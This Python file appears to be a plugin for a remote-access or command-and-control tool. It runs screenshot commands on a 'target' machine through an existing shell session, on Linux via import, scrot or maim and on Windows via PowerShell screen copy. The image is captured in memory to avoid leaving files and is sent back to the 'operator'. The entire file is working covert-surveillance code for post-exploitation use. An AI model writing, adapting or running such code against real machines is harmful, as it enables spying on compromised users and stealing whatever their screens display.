"""Cross-platform desktop screenshot capture (in-memory, no target file drops)."""

import base64
import datetime
import json
import os

from ...constants import PLUGIN_MARK_END, PLUGIN_MARK_START
from ..api import plugin, SessionContext
from ..linux._helpers import build_linux_collector_command
from .common import format_screenshot_report, resolve_session_platform
from .runner import _run_collector_marked, parse_collector_json


def _linux_collector_source():
    return r'''
import base64, os, subprocess
result = {'ok': False, 'tool': '', 'reason': '', 'image_b64': '', 'width': 0, 'height': 0, 'bytes': 0}
if not os.environ.get('DISPLAY') and not os.environ.get('WAYLAND_DISPLAY'):
    result['reason'] = 'No graphical session detected (headless)'
    _emit(result)
else:
    commands = [
        (['import', '-window', 'root', 'png:-'], 'imagemagick-import'),
        (['scrot', '-o', '-'], 'scrot'),
        (['gnome-screenshot', '-f', '-'], 'gnome-screenshot'),
        (['maim', '-'], 'maim'),
        (['xwd', '-root', '-silent'], 'xwd'),
    ]
    for cmd, name in commands:
        try:
            out = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, timeout=8)
            if not out:
                continue
            if name == 'xwd':
                try:
                    conv = subprocess.check_output(
                        ['convert', 'xwd:-', 'png:-'],
                        input=out, stderr=subprocess.DEVNULL, timeout=8,
                    )
                    out = conv
                    name = 'xwd+convert'
                except Exception:
                    continue
            result['ok'] = True
            result['tool'] = name
            result['image_b64'] = base64.b64encode(out).decode('ascii')
            result['bytes'] = len(out)
            break
        except Exception:
            continue
    if not result['ok']:
        result['reason'] = 'No screenshot utility available (import, scrot, gnome-screenshot, maim, or xwd+convert)'
_emit(result)
'''


def _build_linux_command():
    return build_linux_collector_command(_linux_collector_source())


def _build_windows_command():
    return rf"""
$ErrorActionPreference='SilentlyContinue'
$start='{PLUGIN_MARK_START}'; $end='{PLUGIN_MARK_END}'
$result = @{{ ok = $false; tool = 'powershell'; reason = ''; image_b64 = ''; width = 0; height = 0; bytes = 0 }}
try {{
  Add-Type -AssemblyName System.Windows.Forms,System.Drawing -ErrorAction Stop
  $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
  $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
  $graphics = [System.Drawing.Graphics]::FromImage($bmp)
  $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
  $graphics.Dispose()
  $ms = New-Object System.IO.MemoryStream
  $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
  $bytes = $ms.ToArray()
  $ms.Dispose()
  $bmp.Dispose()
  $result.ok = $true
  $result.width = $bounds.Width
  $result.height = $bounds.Height
  $result.bytes = $bytes.Length
  $result.image_b64 = [Convert]::ToBase64String($bytes)
}} catch {{
  $result.reason = $_.Exception.Message
}}
Write-Output ($start+(ConvertTo-Json $result -Compress)+$end)
"""


def _save_screenshot(session: SessionContext, data: dict) -> str:
    logger = session.logger
    if not logger:
        return ''
    stamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
    path = os.path.join(logger.plugins_dir, f'screenshot_{stamp}.png')
    try:
        raw = base64.b64decode(data.get('image_b64', ''))
        with open(path, 'wb') as fh:
            fh.write(raw)
        return path
    except Exception:
        return ''


@plugin.command(
    name='screenshot',
    platforms=['linux', 'windows', 'unix'],
    description='Capture the current desktop and return the image to the operator',
)
def run(session: SessionContext, args):
    session.log_event('Plugin screenshot: capture started')
    session._handler._flush_shell(session._client_sock, timeout=1.0)

    platform = resolve_session_platform(session)
    win_ps = ''
    unix_cmd = 'true'
    if platform == 'windows':
        win_ps = _build_windows_command()
    elif platform in ('unix', 'linux'):
        unix_cmd = _build_linux_command()
    else:
        win_ps = _build_windows_command()
        unix_cmd = _build_linux_command()
        platform = 'unknown'

    raw = _run_collector_marked(session, unix_cmd, win_ps, platform, 30.0)

    if raw is None:
        session.print("Plugin 'screenshot' failed — no response from target.", 'red')
        session.log_plugin_result('screenshot', '', 'no response (timeout or missing markers)')
        return 1

    data = parse_collector_json(raw)
    if not data:
        session.print("Plugin 'screenshot' failed — could not parse results.", 'red')
        session.log_plugin_result('screenshot', raw[:4000], 'parse error')
        return 1

    if data.get('error'):
        session.print(f"Plugin 'screenshot' error on target: {data['error']}", 'red')
        session.log_plugin_result('screenshot', raw[:4000], data.get('traceback', ''))
        return 1

    if data.get('ok') and data.get('image_b64'):
        saved = _save_screenshot(session, data)
        if saved:
            data['saved_path'] = saved

    report = format_screenshot_report(data)
    session.print(report, 'green' if data.get('ok') else 'red')
    log_detail = {k: v for k, v in data.items() if k != 'image_b64'}
    if data.get('image_b64'):
        log_detail['image_b64'] = f"<{len(data['image_b64'])} chars omitted>"
    session.log_plugin_result('screenshot', report, json.dumps(log_detail, indent=2))
    session.log_command('run screenshot', report)
    return 0 if data.get('ok') else 1
